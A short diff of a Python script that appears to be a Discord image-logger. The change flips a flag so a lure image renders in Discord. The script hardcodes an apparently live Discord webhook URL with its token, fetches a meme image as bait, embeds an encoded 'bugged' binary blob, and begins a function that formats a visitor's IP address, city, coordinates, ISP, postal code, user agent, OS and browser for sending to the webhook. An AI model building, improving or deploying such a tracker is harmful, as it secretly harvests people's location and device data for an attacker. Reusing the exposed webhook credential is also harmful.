@@ -5,7 +5,7 @@ import httpx, base64, httpagentparser
 webhook = 'https://discord.com/api/webhooks/1374882218362536129/TSWR43YX7v-p19sB6VdvSClrQbepySeG1L5p-C0wsloCSXsWhsBTdT09Izuw86qIyOIh'
 
 bindata = httpx.get('https://i.kym-cdn.com/entries/icons/original/000/047/549/kurt_angle_meme.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
